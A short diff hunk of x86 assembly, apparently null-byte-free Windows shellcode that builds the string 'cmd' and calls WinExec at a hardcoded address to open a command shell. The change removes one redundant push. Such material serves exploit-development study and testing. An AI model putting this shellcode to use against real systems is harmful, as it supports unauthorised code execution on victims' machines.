@@ -27,7 +27,6 @@ global _start
 	sub ecx, 0x01010101
 	push ecx			; pushing cmd --> null-byte-free 'dmc' obtained with some arithmetic ops in edx
 	mov edx, esp			; storing addr of cmd.exe into edx and pushing it
-	push edx
 	push 1				; pushing command line arg 2
 	push edx
 	mov eax, 0x7C8623AD
